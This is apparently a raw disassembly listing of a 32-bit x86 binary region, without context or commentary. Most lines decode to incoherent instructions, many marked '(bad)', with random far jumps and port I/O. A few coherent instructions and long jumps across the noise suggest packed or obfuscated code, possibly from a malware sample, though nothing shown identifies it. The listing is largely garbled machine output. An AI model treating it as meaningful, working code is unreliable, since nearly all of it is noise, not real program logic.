  4101e9:	push   ebp
  4101ea:	imul   esi,eax,0xd8208eb1
  4101f0:	push   ebp
  4101f1:	xor    esp,DWORD PTR [esi]
  4101f3:	xchg   bl,dh
  4101f5:	lods   al,BYTE PTR ds:[esi]
  4101f6:	sub    BYTE PTR [edx-0x515b2a69],bl
  4101fc:	cld    
  4101fd:	test   ebx,0xca414916
  410203:	fld    st(3)
  410205:	mov    ecx,edx
  410207:	jo     0x410222
  410209:	jl     0x41025f
  41020b:	push   ebp
  41020c:	xor    esi,DWORD PTR [eax+0x22dac61f]
  410212:	mov    cs,edx
  410214:	scas   al,BYTE PTR es:[edi]
  410215:	push   ecx
  410216:	or     cl,bh
  410218:	xchg   ebx,eax
  410219:	fwait
  41021a:	(bad)  
  41021b:	fisttp DWORD PTR [esi+0x11e95ef9]
  410221:	(bad)
  410224:	in     al,dx
  410225:	repz call 0xf1a4b379
  41022b:	mov    ebp,DWORD PTR [ecx]
  41022d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41022e:	sbb    dl,cl
  410230:	mov    bl,0xed
  410232:	imul   esp,DWORD PTR [ebx],0x463dac91
  410238:	in     al,dx
  410239:	cmp    BYTE PTR [edi-0x54],0xb2
  41023d:	repnz fadd st,st(4)
  410240:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410241:	pop    eax
  410242:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410243:	je     0x4101fe
  410245:	mov    ss,WORD PTR [ecx-0x2c]
  410248:	jbe    0x41021f
  41024a:	neg    BYTE PTR [ebp-0x65]
  41024d:	or     DWORD PTR [ebx],0xd511cab4
  410253:	fcmovnu st,st(1)
  410255:	(bad)  
  410257:	(bad)  
  410258:	jmp    FWORD PTR [ebp-0x30ce4186]
  41025e:	pop    edx
  41025f:	push   cs
  410260:	dec    edx
  410261:	ret    0xa74
  410264:	mov    ecx,0x67818c27
  410269:	cmc    
  41026a:	nop
  41026b:	jp     0x410292
  41026d:	inc    edi
  41026e:	fiadd  DWORD PTR ds:0xb36e7803
  410274:	mov    esi,0xee6dfbee
  410279:	in     al,0x82
  41027b:	retf   0xe2db
  41027e:	mov    esi,0x643ca319
  410283:	push   esi
  410284:	jae    0x41024c
  410286:	stos   BYTE PTR es:[edi],al
  410287:	or     esp,DWORD PTR [eax]
  410289:	lods   al,BYTE PTR ds:[esi]
  41028a:	add    ecx,DWORD PTR ds:0xc9c1d539
  410290:	fcom   DWORD PTR [esp+ebx*8-0x4ea3bc86]
  410297:	ret    0x6878
  41029a:	ins    DWORD PTR es:[edi],dx
  41029b:	cli    
  41029c:	push   edi
  41029d:	and    edi,DWORD PTR ds:0x70182f59
  4102a3:	push   0x8e09e3c9
  4102a8:	std    
  4102a9:	rol    DWORD PTR [ecx],cl
  4102ab:	sub    DWORD PTR [ebx],edx
  4102ad:	outs   dx,DWORD PTR ds:[esi]
  4102ae:	or     DWORD PTR [esi+ebp*4-0x535c2437],ecx
  4102b5:	call   0xc76f:0x31f67e8e
  4102bc:	mov    DWORD PTR [edi],ebx
  4102be:	inc    ebp
  4102bf:	lahf   
  4102c0:	pop    esi
  4102c1:	jne    0x410302
  4102c3:	mov    esi,0x707bd3bb
  4102c8:	and    al,0x7f
  4102ca:	packuswb mm3,QWORD PTR [esp+ebp*2-0x3b85c8ec]
  4102d2:	in     al,0xd7
  4102d4:	(bad)  
  4102d5:	fisub  DWORD PTR [ebp-0x12ff9d29]
  4102db:	pop    ds
  4102dc:	mov    esi,0xea94ad50
  4102e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102e2:	outs   dx,DWORD PTR ds:[esi]
  4102e3:	jmp    0xa3a6:0xe14b8162
  4102ea:	aas    
  4102eb:	xor    edi,DWORD PTR [ebx+0x77a08175]
  4102f1:	test   dh,dh
  4102f3:	div    DWORD PTR [esi-0x1fb38683]
  4102f9:	adc    bh,BYTE PTR [ebp-0x29]
  4102fc:	xchg   edx,eax
  4102fd:	addr16 push 0x21e226fc
  410303:	jae    0x41028f
  410305:	jbe    0x4102cd
  410307:	xchg   ebp,eax
  410308:	sub    DWORD PTR [esi],ecx
  41030a:	mov    eax,ds:0xf0c4cc4b
  41030f:	fisttp QWORD PTR [ebp+0x50]
  410312:	mov    ebx,0xdb953d5b
  410317:	mov    ds:0x44935ac5,al
  41031c:	cmp    al,0x13
  41031e:	mov    edx,0x6a77a543
  410323:	mov    eax,0x785fbbe7
  410328:	mov    WORD PTR [ebx],ds
  41032a:	retf   0x67ec
  41032d:	cwde   
  41032e:	aad    0x9b
  410330:	or     DWORD PTR [eax+edx*4],ebx
  410333:	adc    dh,0x30
  410336:	ds dec ebx
  410338:	test   BYTE PTR [eax-0xdf6ce7e],bl
  41033e:	inc    edx
  41033f:	and    esp,DWORD PTR [edx-0x5fb4ba12]
  410345:	cmp    eax,0x6ba9444d
  41034a:	lock clc 
  41034c:	popa   
  41034d:	sub    cl,bh
  41034f:	jecxz  0x410350
  410351:	imul   ecx,DWORD PTR [edx],0x3e80a497
  410357:	dec    edi
  410358:	arpl   WORD PTR [eax],ax
  41035a:	sbb    eax,0xae7dc73d
  41035f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410360:	xlat   BYTE PTR ds:[ebx]
  410361:	mov    ds:0xddef7bca,eax
  410366:	fdivr  DWORD PTR [ebx+ebp*8]
  410369:	into   
  41036a:	outs   dx,BYTE PTR ds:[esi]
  41036b:	push   0x1e
  41036d:	push   cs
  41036e:	push   es
  41036f:	dec    eax
  410370:	sub    BYTE PTR [eax+0x4c5a731b],al
  410376:	pop    ss
  410377:	gs push ebx
  410379:	(bad)  
  41037a:	mov    dl,0x3e
  41037c:	ret    0x98b5
  41037f:	retf   
  410380:	xor    al,0xf8
  410382:	jae    0x410368
  410384:	or     ch,0x1f
  410387:	int    0xc5
  410389:	stos   BYTE PTR es:[edi],al
  41038a:	adc    esp,edi
  41038c:	ds pusha 
  41038e:	test   DWORD PTR [ecx-0xd],esi
  410391:	(bad)
  410394:	inc    ecx
  410395:	mov    DWORD PTR [ebp+0x8],ecx
  410398:	add    eax,0x2082
  41039d:	mov    eax,DWORD PTR [ebp-0x4]
  4103a0:	mov    ecx,DWORD PTR ds:0x42fd85
  4103a6:	add    ecx,DWORD PTR ds:0x42fd89
  4103ac:	mov    DWORD PTR ds:0x42fd85,ecx
  4103b2:	xor    eax,edx
  4103b4:	sub    DWORD PTR ds:0x42e19c,ebx
  4103ba:	push   esi
  4103bb:	sbb    ecx,ecx
  4103bd:	jmp    0x410787
  4103c2:	lods   al,BYTE PTR ds:[esi]
  4103c3:	das    
  4103c4:	mov    ds:0xaa91a114,al
  4103c9:	mov    bh,0x91
  4103cb:	call   0x7d0e:0x7efebab6
  4103d2:	pop    eax
  4103d3:	mov    edx,0x7da37070
  4103d8:	jo     0x41044a
  4103da:	shl    DWORD PTR [ebp-0x64b0c479],cl
  4103e0:	(bad)  
  4103e1:	mov    BYTE PTR [edx],ch
  4103e3:	sub    bl,ah
  4103e5:	fidivr WORD PTR [edi-0x16]
  4103e8:	or     BYTE PTR [eax+eiz*2-0x43],bh
  4103ec:	and    bh,BYTE PTR [esp+ebp*8]
  4103ef:	dec    esi
  4103f0:	daa    
  4103f1:	dec    edx
  4103f2:	mov    bh,0xa0
  4103f4:	dec    edi
  4103f5:	sbb    cl,al
  4103f7:	push   ecx
  4103f8:	inc    eax
  4103f9:	push   ebp
  4103fa:	popf   
  4103fb:	sbb    eax,0xa09a1d0d
  410400:	adc    esi,edx
  410402:	pop    es
  410403:	mov    bl,0xed
  410405:	pop    esi
  410407:	jbe    0x410485
  410409:	xor    DWORD PTR [edx],0x11
  41040c:	(bad)  
  41040d:	sub    ebx,ecx
  41040f:	cmp    al,0xbf
  410411:	and    BYTE PTR [esi],dl
  410413:	adc    BYTE PTR [edi-0x77],cl
  410416:	adc    BYTE PTR [eax+0x69fbcc03],dl
  41041c:	pop    ss
  41041d:	adc    DWORD PTR [ebx],esi
  41041f:	push   cs
  410420:	mov    bh,0xf1
  410422:	mov    ecx,0x3a9fdc5
  410427:	push   eax
  410428:	inc    esi
  410429:	or     al,0xa
  41042c:	push   0x5c
  41042e:	outs   dx,BYTE PTR ds:[esi]
  41042f:	mov    dh,0x56
  410431:	fcomi  st,st(7)
  410433:	fnstcw WORD PTR [eax]
  410435:	xchg   ecx,eax
  410436:	aad    0xfa
  410438:	adc    DWORD PTR [ecx+0x38cea605],0x9e991ceb
  410442:	fcmovbe st,st(3)
  410444:	push   ecx
  410445:	jg     0x410469
  410447:	pop    edx
  410448:	or     eax,0xa1efcc41
  41044d:	or     BYTE PTR [ecx],bl
  41044f:	mov    edx,0x945fb3d5
  410454:	icebp  
  410455:	test   DWORD PTR [bx+di],esp
  410458:	popf   
  410459:	dec    esi
  41045a:	mov    WORD PTR [ebp+0x76625bb1],ds
  410460:	fwait
  410461:	fwait
  410462:	sub    al,0xe3
  410464:	enter  0x7185,0x7c
  410468:	sbb    BYTE PTR [eax-0x255c3f01],0x12
  41046f:	into   
  410470:	pop    edi
  410471:	add    BYTE PTR [esi+0xa710f7e],bh
  410477:	or     eax,0x14cf1616
  41047c:	mov    ecx,0x8ceec173
  410481:	inc    eax
  410482:	aad    0x2a
  410484:	jo     0x410486
  410486:	mov    ch,0x25
  410488:	pop    DWORD PTR [ebp+ecx*1-0x2f]
  41048c:	call   0x2de2:0xe7623de9
  410493:	inc    ecx
  410494:	jmp    0x410492
  410496:	sub    eax,0xa8b1fdde
  41049b:	aam    0x84
  41049d:	add    DWORD PTR [ebx-0x55],edx
  4104a0:	xor    BYTE PTR ds:0x7e955023,al
  4104a6:	jne    0x41050b
  4104a8:	pop    ss
  4104a9:	ins    DWORD PTR es:[edi],dx
  4104aa:	adc    al,0x53
  4104ac:	jmp    0xe07d:0xb91ff14a
  4104b3:	imul   edi,DWORD PTR [edi-0x32dc132a],0xee3e082d
  4104bd:	cld    
  4104be:	push   es
  4104bf:	adc    ah,al
  4104c1:	jb     0x41053c
  4104c3:	cmp    eax,0x4c7996c5
  4104c8:	and    BYTE PTR [eax+0x54],dl
  4104cb:	(bad)  
  4104cc:	push   ss
  4104cd:	mov    eax,ds:0xb97cdb26
  4104d2:	dec    esp
  4104d3:	jne    0x4104fb
  4104d5:	mov    edx,0x37540513
  4104da:	retf   0x85ae
  4104dd:	jae    0x4104e8
  4104df:	and    eax,0x44229395
  4104e4:	fst    QWORD PTR [eax-0x3c]
  4104e7:	cmp    DWORD PTR [esi-0x22a3f2d8],esi
  4104ed:	fwait
  4104ee:	mov    esi,0xc867a949
  4104f3:	out    0xb0,eax
  4104f5:	fidiv  WORD PTR [ebx+0x8]
  4104f8:	scas   al,BYTE PTR es:[edi]
  4104f9:	test   al,0xa5
  4104fb:	aas    
  4104fc:	xchg   BYTE PTR [edi-0x3ccc5023],dh
  410502:	ret    
  410503:	add    edx,ebx
  410505:	int    0x8e
  410507:	or     BYTE PTR [ebp+0x73],cl
  41050a:	jle    0x4104c6
  41050c:	pop    ss
  41050d:	pop    edx
  41050e:	push   edx
  41050f:	out    0x34,al
  410511:	xor    edi,ebp
  410513:	xor    eax,DWORD PTR [edx-0x6eeac8a]
  410519:	stos   BYTE PTR es:[edi],al
  41051a:	addr16 das 
  41051c:	push   edi
  41051d:	out    0xe8,al
  41051f:	lock je 0x4104de
  410522:	adc    DWORD PTR [edi-0x463d126f],esp
  410528:	pop    es
  410529:	sar    BYTE PTR [ecx-0x9],1
  41052c:	iret   
  41052d:	fsubr  QWORD PTR [ecx-0x5a]
  410530:	mov    al,ds:0xfd7226d2
  410535:	mov    ebx,0x48041a3f
  41053a:	stos   DWORD PTR es:[edi],eax
  41053b:	push   0xffffffce
  41053d:	out    0xf8,eax
  41053f:	pop    ss
  410540:	push   ebp
  410541:	inc    eax
  410542:	or     DWORD PTR [ebx-0x67],ecx
  410545:	add    BYTE PTR [ebx],cl
  410547:	stos   BYTE PTR es:[edi],al
  410548:	dec    ebp
  410549:	jo     0x4104fa
  41054b:	pop    eax
  41054c:	xor    DWORD PTR [ecx+edi*2],ebx
  41054f:	sbb    eax,0x74310d36
  410554:	gs adc al,0x72
  410557:	push   esi
  410558:	gs ret 
  41055a:	pop    ecx
  41055b:	cld    
  41055c:	leave  
  41055d:	mov    dl,BYTE PTR [ebx+0x4b]
  410560:	or     dh,BYTE PTR [eax+0x230e1377]
  410566:	bnd jbe 0x4105d0
  410569:	jno    0x41051a
  41056b:	inc    ebx
  41056c:	inc    eax
  41056d:	cmp    cl,BYTE PTR [esi+0x475cfa50]
  410573:	push   ebp
  410574:	into   
  410575:	and    al,0x2a
  410577:	or     esi,DWORD PTR [ecx-0x175f15d]
  41057d:	inc    esp
  41057e:	dec    esp
  41057f:	mov    esp,0x70836ece
  410584:	jmp    0xb965:0xd1cbec12
  41058b:	mov    al,0x80
  41058d:	je     0x4105a9
  41058f:	sub    dl,BYTE PTR [edx-0x574c1a38]
  410595:	imul   ebx,DWORD PTR [edx],0x1b
  410598:	popa   
  410599:	cwde   
  41059a:	js     0x4105a8
  41059c:	popf   
  41059d:	out    dx,al
  41059e:	jno    0x410554
  4105a0:	mov    esi,0x9330ec7a
  4105a5:	xor    al,0x7
  4105a7:	ja     0x41058f
  4105a9:	pop    esi
  4105aa:	stos   BYTE PTR es:[edi],al
  4105ab:	arpl   WORD PTR [ecx+edi*4-0x4efc2ba6],di
  4105b2:	sub    eax,0x3103b03e
  4105b7:	mov    ds:0x9f342386,al
  4105bc:	or     edi,DWORD PTR [edi+0x329a8542]
  4105c2:	push   ebp
  4105c3:	pushf  
  4105c4:	jp     0x41061d
  4105c6:	into   
  4105c7:	adc    eax,DWORD PTR [edx-0x71]
  4105ca:	sar    BYTE PTR [ecx-0x61],1
  4105cd:	imul   edx,DWORD PTR [eax+0x36c66f65],0x5f7cdf38
  4105d7:	fidivr DWORD PTR [eax+0x7bc67f82]
  4105dd:	mov    esi,0xaf2054aa
  4105e2:	mov    BYTE PTR [esp+edx*4],cl
  4105e5:	or     al,0xe5
  4105e7:	sbb    BYTE PTR [edx],bl
  4105e9:	sbb    BYTE PTR [ebx],bh
  4105eb:	shl    edi,cl
  4105ed:	repnz int3 
  4105ef:	ins    BYTE PTR es:[edi],dx
  4105f0:	dec    eax
  4105f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105f2:	out    0x44,al
  4105f4:	inc    ebx
  4105f5:	dec    ebx
  4105f6:	inc    edi
  4105f7:	pop    edi
  4105f8:	into   
  4105f9:	adc    dl,BYTE PTR [ebx-0x47f67e2d]
  4105ff:	je     0x410645
  410601:	sbb    al,0x8d
  410603:	ins    DWORD PTR es:[edi],dx
  410604:	sar    DWORD PTR [eax+0x4c0bd0b1],1
  41060a:	xlat   BYTE PTR ds:[ebx]
  41060b:	xchg   edi,eax
  41060c:	mov    al,BYTE PTR [ebx+0x40c707a7]
  410612:	mov    DWORD PTR [esp+edi*4],ebx
  410615:	xchg   ebx,eax
  410616:	pop    esi
  410617:	lods   eax,DWORD PTR ds:[esi]
  410618:	jle    0x4105f3
  41061a:	add    esi,DWORD PTR [ebp-0x6e]
  41061d:	mov    al,ds:0xaf3e1092
  410622:	mov    ebp,0x986aaab5
  410627:	push   0x6b92b869
  41062c:	push   edx
  41062d:	sbb    eax,0x159f12fa
  410632:	and    dh,al
  410634:	dec    edi
  410635:	repnz adc DWORD PTR [ebx+0x21],ebx
  410639:	sbb    eax,0xf0605233
  41063e:	and    dh,ah
  410640:	push   0xffffffc8
  410642:	jb     0x410690
  410644:	jp     0x410690
  410646:	test   al,0x0
  410648:	xchg   edi,eax
  410649:	push   edx
  41064a:	out    dx,al
  41064b:	xor    eax,0xb350a67
  410650:	loop   0x410608
  410652:	xchg   BYTE PTR [ebx+ebp*1+0x63812bd1],al
  410659:	add    ch,BYTE PTR [eax]
  41065b:	inc    esp
  41065c:	stc    
  41065d:	and    bl,BYTE PTR [ebx]
  41065f:	mov    eax,ds:0xd8d17c77
  410664:	mov    ah,0x95
  410666:	push   edi
  410667:	fwait
  410668:	cmp    al,0x20
  41066a:	mov    ch,0xd0
  41066c:	mov    BYTE PTR [esi+0x73f6b24b],ah
  410672:	and    ebx,ebp
  410674:	repnz xor bl,al
  410677:	adc    bl,ah
  410679:	mov    eax,0x3b8558ac
  41067e:	ins    DWORD PTR es:[edi],dx
  41067f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410680:	daa    
  410681:	cmp    al,0xb4
  410683:	rcr    BYTE PTR [edx+0x49],cl
  410686:	data16 jmp 0x410703
  410689:	repz sbb al,0xfb
  41068c:	inc    ebx
  41068d:	(bad)  [esi+0x2e8e2d0c]
  410693:	out    dx,al
  410694:	ret    0x9d30
  410697:	stos   BYTE PTR es:[edi],al
  410698:	mov    ah,0x8d
  41069a:	pop    ss
  41069b:	and    DWORD PTR [edi+0x3e874a55],0xffffffb4
  4106a2:	cmp    cl,BYTE PTR [ebx]
  4106a4:	test   DWORD PTR [edx-0x529ee24a],edi
  4106aa:	je     0x41064f
  4106ac:	data16 xlat BYTE PTR ds:[ebx]
  4106ae:	cs sub eax,0xc4524101
  4106b4:	sub    edi,DWORD PTR [edx-0x1c]
  4106b7:	push   ss
  4106b8:	mov    ebx,DWORD PTR [eax+0x67]
  4106bb:	mov    BYTE PTR [ebx+0x45f0574f],bh
  4106c1:	cmp    DWORD PTR [ecx-0x5aa94a08],edx
  4106c7:	int    0x6c
  4106c9:	test   al,0xf
  4106cb:	pop    edi
  4106cc:	sub    eax,eax
  4106ce:	dec    eax
  4106cf:	outs   dx,DWORD PTR ds:[esi]
  4106d0:	adc    ecx,DWORD PTR [ecx+0x6a]
  4106d3:	out    dx,eax
  4106d4:	inc    edi
  4106d5:	outs   dx,BYTE PTR ds:[esi]
  4106d6:	xchg   esi,eax
  4106d7:	xchg   edi,eax
  4106d8:	out    0xa5,eax
  4106da:	cwde   
  4106db:	hlt    
  4106dc:	jmp    0x2:0x445ecb
  4106e3:	xchg   esi,eax
  4106e4:	jnp    0x4106ee
  4106e6:	cli    
  4106e7:	aam    0xd7
  4106e9:	aas    
  4106ea:	pop    es
  4106eb:	sbb    esi,DWORD PTR [eax-0x6f1b46d8]
  4106f1:	xlat   BYTE PTR ds:[ebx]
  4106f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106f3:	arpl   WORD PTR ds:0xf0d56a18,cx
  4106f9:	mov    WORD PTR [esi+0x7a],cs
  4106fc:	test   BYTE PTR [edi+0x7264cc61],cl
  410702:	scas   al,BYTE PTR es:[edi]
  410703:	xchg   BYTE PTR [edi+0x6f],ah
  410706:	sti    
  410707:	push   ds
  410708:	dec    ecx
  410709:	or     dl,BYTE PTR ds:0x6ca38d69
  41070f:	adc    DWORD PTR [ecx],esp
  410711:	aaa    
  410712:	(bad)  
  410713:	mov    WORD PTR [esi],cs
  410715:	jae    0x41071c
  410717:	xchg   edx,eax
  410718:	js     0x4106e4
  41071a:	enter  0xf69e,0xdc
  41071e:	rol    DWORD PTR [edx-0x71],cl
  410721:	jne    0x410705
  410723:	in     eax,0xb7
  410725:	bound  esp,QWORD PTR [eax-0x67639dac]
  41072b:	mov    dl,0x97
  41072d:	sub    al,0x7c
  41072f:	mov    ds:0x5e6f4a9c,al
  410734:	mov    ebx,0x5a4fe8ed
  410739:	pushf  
  41073a:	jl     0x410719
  41073c:	dec    edx
  41073d:	and    BYTE PTR [ebx+ebp*8-0x4a13391c],0x14
  410745:	mov    al,0xdf
  410747:	(bad)
  41074a:	add    ah,dh
  41074c:	stos   DWORD PTR es:[edi],eax
  41074d:	(bad)  
  41074f:	sub    eax,0x21d19595
  410754:	idiv   BYTE PTR [eax]
  410756:	push   ebp
  410757:	dec    eax
  410758:	lods   al,BYTE PTR ds:[esi]
  410759:	aam    0x6a
  41075b:	hlt    
  41075c:	popf   
  41075d:	stos   BYTE PTR es:[edi],al
  41075e:	mov    eax,DWORD PTR [edi]
  410760:	jb     0x41078b
  410762:	pushf  
  410763:	lahf   
  410764:	mov    al,ds:0xc4503a45
  410769:	lock loop 0x410739
  41076c:	pop    ebp
  41076d:	jno    0x4106f0
  41076f:	push   ss
  410770:	inc    esi
  410771:	jbe    0x410735
  410773:	test   DWORD PTR [ebp+edi*4-0x56e369ff],edi
  41077a:	das    
  41077b:	xchg   edx,eax
  41077c:	and    al,BYTE PTR [ecx-0x34]
  41077f:	fbstp  TBYTE PTR [eax-0x7f]
  410782:	lods   eax,DWORD PTR ds:[esi]
  410783:	dec    ecx
  410784:	jge    0x410749
  410786:	daa    
  410787:	mov    esi,DWORD PTR [ebp+0x8]
  41078a:	sbb    ecx,0x2f26
  410790:	mov    ecx,0x32729c
  410795:	add    eax,ecx
  410797:	jmp    0x410b61
  41079c:	outs   dx,DWORD PTR ds:[esi]
  41079d:	mov    ebp,ds
  41079f:	or     al,0xd9
  4107a1:	imul   ebp,DWORD PTR [ecx+0x6b],0x19f67ea1
  4107a8:	rcr    DWORD PTR [ecx+0x468b471c],1
  4107ae:	jo     0x410820
  4107b0:	mov    ds:0x2f70707d,eax
  4107b5:	mov    dh,0xcc
  4107b7:	pop    ebx
  4107b8:	outs   dx,DWORD PTR ds:[esi]
  4107b9:	test   eax,0xdc2135c2
  4107be:	stos   DWORD PTR es:[edi],eax
  4107bf:	sti    
  4107c0:	mov    bl,0xb4
  4107c2:	(bad)  
  4107c4:	xchg   edi,eax
  4107c5:	sub    esp,ebx
  4107c7:	mov    dl,0xa8
  4107c9:	arpl   WORD PTR [esi-0x4a4e6097],ax
  4107cf:	fcom   QWORD PTR [bp+si-0x6511]
  4107d4:	push   edx
  4107d5:	sub    DWORD PTR [esi],esp
  4107d7:	push   esi
  4107d8:	fucom  st(4)
  4107da:	dec    ecx
  4107db:	in     al,dx
  4107dc:	int    0x1c
  4107de:	jb     0x4107e9
  4107e0:	lods   al,BYTE PTR ds:[esi]
  4107e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107e3:	dec    ebp
  4107e4:	arpl   WORD PTR [ecx],sp
  4107e6:	mov    ds:0x983bc4e5,eax
  4107eb:	jae    0x4107b0
  4107ed:	ret    0x62f
  4107f0:	int3   
  4107f1:	mov    esp,0xe68fb5bb
  4107f6:	pop    ds
  4107f7:	xchg   edi,eax
  4107f8:	(bad)  [eax]
  4107fa:	dec    ecx
  4107fb:	test   DWORD PTR [edx+0x7667ceac],esi
  410801:	test   DWORD PTR [ebx-0x708b7606],esi
  410807:	popa   
  410808:	push   DWORD PTR [esi]
  41080a:	popa   
  41080b:	jnp    0x41078e
  41080d:	inc    esp
  41080e:	jg     0x4107ed
  410810:	(bad)  
  410811:	cld    
  410812:	mov    ds:0x4a349b4d,eax
  410817:	(bad)  
  410818:	pop    ss
  410819:	(bad)
  41081c:	mov    ah,ch
  41081e:	icebp  
  41081f:	sbb    edx,ecx
  410821:	mov    ebx,0x4945bede
  410826:	sbb    DWORD PTR [esi+edi*2],ebx
  410829:	fucomp st(7)
  41082b:	mov    cl,0xf5
  41082d:	mov    bh,0xbc
  41082f:	mov    ch,0x41
  410831:	cmc    
  410832:	ja     0x4107f4
  410834:	mov    edi,0xe8d1ab9a
  410839:	imul   eax,DWORD PTR [edx-0x3e],0x7ddd8b8b
  410840:	mov    DWORD PTR [edi],ecx
  410842:	je     0x77d78519
  410848:	pop    es
  410849:	cmp    bl,BYTE PTR [ebx]
  41084b:	push   edi
  41084c:	ins    BYTE PTR es:[edi],dx
  41084d:	call   0xa2f5f850
  410852:	push   esi
  410853:	sub    al,0xde
  410855:	stos   BYTE PTR es:[edi],al
  410856:	xchg   ecx,eax
  410857:	mov    ch,0x2
  410859:	jl     0x4108d6
  41085b:	sbb    edi,DWORD PTR [ebp+ecx*8-0x1baa60ed]
  410862:	not    BYTE PTR [ebx+edx*4]
  410865:	jo     0x4108d6
  410867:	popf   
  410868:	addr16 pop es
  41086a:	mov    esi,0x3915f5e7
  41086f:	dec    ebp
  410870:	sub    edi,DWORD PTR [edx]
  410872:	loopne 0x41084f
  410874:	sbb    al,0x9f
  410876:	sub    al,0x5c
  410878:	pop    ss
  410879:	ins    BYTE PTR es:[edi],dx
  41087a:	pop    esi
  41087b:	add    al,0xd2
  41087d:	into   
  41087e:	push   esi
  41087f:	sti    
  410880:	push   DWORD PTR [edx]
  410882:	fcomi  st,st(0)
  410884:	outs   dx,BYTE PTR ds:[esi]
  410885:	adc    edi,DWORD PTR [ebx]
  410887:	jg     0x410901
  410889:	(bad)  [edi-0x5b]
  41088c:	mov    ebx,edi
  41088e:	push   edx
  41088f:	xor    edx,DWORD PTR [ebp-0x1341d53e]
  410895:	arpl   si,si
  410897:	out    dx,al
  410898:	mov    bl,0x30
  41089a:	cld    
  41089b:	(bad)  
  41089c:	mov    WORD PTR [ebx],ds
  41089e:	call   0x64d75802
  4108a3:	pusha  
  4108a4:	add    al,0xd7
  4108a6:	mov    ds:0x2885a310,al
  4108ab:	shl    esi,1
  4108ad:	jmp    DWORD PTR [esp+edi*1+0x465bf3f2]
  4108b4:	adc    esi,DWORD PTR [edi]
  4108b6:	test   DWORD PTR [ebx+0x3b3f6065],esi
  4108bc:	mov    fs,esp
  4108be:	sbb    eax,0x55754827
  4108c3:	rol    DWORD PTR [ebx+0x36],1
  4108c6:	jae    0x4108a0
  4108c8:	mov    al,0x57
  4108ca:	sar    esp,cl
  4108cc:	push   edx
  4108cd:	jmp    0x84c8:0x963188d3
  4108d4:	dec    edx
  4108d5:	xor    esi,ebx
  4108d7:	aad    0x18
  4108d9:	loopne 0x410933
  4108db:	jp     0x410873
  4108dd:	(bad)  
  4108de:	jg     0x4108f5
  4108e0:	dec    ebp
  4108e1:	mov    cl,0xcf
  4108e3:	cli    
  4108e4:	push   ebx
  4108e5:	cs sahf 
  4108e7:	inc    esp
  4108e8:	cs leave 
  4108ea:	mov    ds:0xc60b58c7,al
  4108ef:	mov    ebx,0x963cb312
  4108f4:	mov    ebx,0x2f7a6f14
  4108f9:	(bad)  
  4108fb:	(bad)
  4108fe:	shl    edx,1
  410900:	fild   QWORD PTR [edi+0x1faa31a7]
  410906:	jae    0x4108b4
  410908:	inc    esi
  410909:	sub    bl,bl
  41090b:	cmp    bh,BYTE PTR [edx]
  41090d:	sbb    DWORD PTR [eax-0x29fe148e],ebp
  410913:	and    al,0x2f
  410915:	hlt    
  410916:	mov    esp,0x9221662b
  41091b:	mov    al,ds:0x9fbd6a05
  410920:	daa    
  410921:	sub    al,0xee
  410923:	pop    esi
  410924:	popa   
  410925:	mov    BYTE PTR [edi+0xb],ch
  410928:	push   0xcee32e16
  41092d:	push   ss
  41092e:	jmp    0x37c5:0xbc9f8522
  410935:	pop    ebx
  410936:	loop   0x410913
  410938:	sbb    al,0xfb
  41093a:	pop    esi
  41093b:	add    al,0x98
  41093d:	cdq    
  41093e:	aam    0x23
  410940:	ret    0xfcd1
  410943:	outs   dx,BYTE PTR ds:[esi]
  410944:	sbb    cl,ch
  410946:	adc    BYTE PTR [ebx],dh
  410948:	mov    bh,0x73
  41094a:	pop    es
  41094b:	or     dl,bh
  41094d:	jmp    edi
  41094f:	add    esi,DWORD PTR [esi+0x19]
  410952:	and    ecx,DWORD PTR [ecx]
  410954:	outs   dx,BYTE PTR ds:[esi]
  410955:	sub    bh,BYTE PTR [ecx-0xc]
  410958:	cmp    bl,ah
  41095a:	outs   dx,DWORD PTR ds:[esi]
  41095b:	es (bad) 
  41095d:	jecxz  0x410974
  41095f:	add    edi,ebp
  410961:	dec    esi
  410962:	sub    BYTE PTR [ebx+0x76],bh
  410965:	jp     0x4109cc
  410967:	xlat   BYTE PTR ds:[ebx]
  410968:	jp     0x410939
  41096a:	(bad)  
  41096b:	jnp    0x410937
  41096d:	test   eax,0xe33a5bcb
  410972:	ja     0x4108fd
  410974:	jo     0x4109e9
  410976:	mov    ah,BYTE PTR ds:0xddc77572
  41097c:	mov    bh,0x36
  41097e:	in     eax,dx
  41097f:	push   0xffffffb2
  410981:	jecxz  0x410941
  410983:	hlt    
  410984:	rol    WORD PTR [ecx+0x1a],0xd7
  410989:	sub    BYTE PTR [ebp-0x388cfe0d],al
  41098f:	pop    es
  410990:	and    ebx,DWORD PTR [ecx+0x5e]
  410993:	mov    dh,0x3a
  410995:	test   eax,0xf26f0074
  41099a:	add    BYTE PTR [ebx-0xd],cl
  41099d:	cli    
  41099e:	and    esp,eax
  4109a0:	rcr    BYTE PTR [ebx-0x7e],cl
  4109a3:	cmp    DWORD PTR [edi-0x34e9304c],ecx
  4109a9:	cmp    ebp,DWORD PTR [ebx+0x57aea20d]
  4109af:	mov    WORD PTR [esi-0x565be65c],?
  4109b5:	ror    DWORD PTR [edi],0x1
  4109b8:	sbb    eax,0xe8a2032e
  4109bd:	in     al,0x86
  4109bf:	pop    esi
  4109c0:	aaa    
  4109c1:	push   ebx
  4109c2:	sub    DWORD PTR [ebx+0x28],edi
  4109c5:	mov    BYTE PTR [eax+0x200dc693],cl
  4109cb:	xchg   ebx,eax
  4109cc:	xchg   esp,eax
  4109cd:	sbb    eax,0x8347579d
  4109d2:	push   ecx
  4109d3:	add    al,0x67
  4109d5:	imul   esp,ebp,0x2f
  4109d8:	pop    eax
  4109d9:	out    0x7a,eax
  4109db:	fstp   TBYTE PTR [edx]
  4109dd:	sti    
  4109de:	lds    eax,FWORD PTR [edx]
  4109e0:	and    edi,ebx
  4109e2:	loop   0x410a12
  4109e4:	test   BYTE PTR ds:0x8f691358,al
  4109ea:	sub    al,0xcd
  4109ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109ed:	mov    ebp,0x5bf99109
